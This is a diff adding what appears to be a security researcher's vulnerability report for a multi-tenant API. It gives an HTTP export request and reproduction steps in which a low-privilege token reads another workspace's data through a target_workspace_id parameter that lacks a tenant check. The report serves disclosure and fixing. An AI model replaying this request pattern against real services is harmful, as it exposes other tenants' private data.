@@ -1,0 +1,17 @@
+GET /api/v1/workspaces/ws_8492/export HTTP/1.1
+Host: target-api.internal.northstarlabs.io
+User-Agent: Mozilla/5.0 (Security Researcher Assessment - BBT-0041)
+Authorization: Bearer <RESEARCHER_USER_TOKEN_WORKSPACE_A>
+Accept: application/json
+X-Forwarded-For: 198.51.100.42
+
+[REQUEST PARAMETERS]
+target_workspace_id: ws_9021 (Atlas Production Tenant - Workspace B)
+export_format: json_compressed
+include_audit_trail: true
+
+[REPRODUCTION STEPS]
+1. Authenticate as low-privilege auditor in Workspace A (ws_8492).
+2. Issue GET request to /api/v1/workspaces/ws_8492/export specifying 'target_workspace_id=ws_9021'.
+3. Auth interceptor validates token validity for ws_8492 but omits tenant boundary check on target_workspace_id.
+4. Server responds with HTTP 200 OK and exports tenant data belonging to Workspace B.
